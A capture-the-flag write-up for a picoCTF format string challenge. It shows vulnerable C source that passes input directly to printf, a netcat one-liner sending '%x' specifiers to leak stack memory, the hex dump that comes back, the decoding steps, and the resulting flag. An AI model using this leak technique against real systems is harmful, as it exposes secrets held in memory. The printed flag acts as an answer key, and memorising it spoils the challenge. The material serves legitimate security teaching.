**Description**

Author: Neel Bhavsar

Story telling class 1/2 I'm just copying and pasting with this program. What can go wrong? You can view source here. And connect with it using: nc saturn.picoctf.net 63442

Hints
1) Format Strings

**Research**

A [format string](https://en.wikipedia.org/wiki/Uncontrolled_format_string) vulnerability abuses format strings such as %s and %p and improper data sanitation to remove malicious strings from executing some task. In the case of a format string vulnerability flawed or nonexistent data sanitation is abused to make the program print a format string as if it were trying to use that format string instead of printing the characters associated with that format string.

**Exploitation**

Lets look at the program source:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

The vuln function loads the flag into the flag variable. It then loads 127 characters from the terminal into the story variable. Finally, it prints the story varible with [printf](https://en.wikipedia.org/wiki/Printf_format_string#Vulnerabilities) which is succeptible to format string vulnerabilities.

You can leak memory in this program with %x, so lets pass a bunch of these into this program on the server

```python2 -c 'print("%x"*100)' | nc saturn.picoctf.net 63442```

It dumps:

```
Tell me a story and then I'll tell you one >> Here's a story - 
ff8476e0ff8477008049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f625f6b63653034387d393738fbad2000f8ed87000f7f10990804c00080494100804c000ff8477c880494182ff847874ff8478800ff8477e000f7d06ee5
```

This looks intimidiatin, but we can break this down.

```picoCTF{``` = ```70 69 63 6f 43 54 46 7b```

The endianess of this program is little, so we can invert this to look like ```6f636970 7b465443```

This is in the file! Lets cut off the beginning stuff.

```
6f636970
7b465443
6b34334c
5f676e31
67346c46
6666305f
3474535f
625f6b63
65303438
7d393738
fbad2000
f8ed8700
0f7f1099
0804c000
80494100
804c000f
f8477c88
0494182f
f847874f
f8478800
ff8477e0
00f7d06e
```

Now we can use a tool like [Cyber Chef](https://gchq.github.io/CyberChef) to do this automatically

Swap the endianess and convert from hex to ascii
This gives us the flag!
It is: ```picoCTF{L34k1ng_Fl4g_0ff_St4ck_b840e879}```
